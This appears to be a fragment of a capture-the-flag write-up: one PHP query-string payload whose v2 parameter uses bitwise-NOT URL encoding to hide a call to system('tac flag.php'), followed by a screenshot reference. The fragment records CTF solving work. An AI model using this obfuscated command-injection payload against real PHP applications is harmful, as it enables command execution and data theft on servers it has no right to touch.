&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?v1=1&amp;amp;v3=1&amp;amp;v2=*(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250816192432293.png&#34; alt=&#34;image-20250816192432293&#34; style=&#34;zoom:25%;&#34; /&gt;

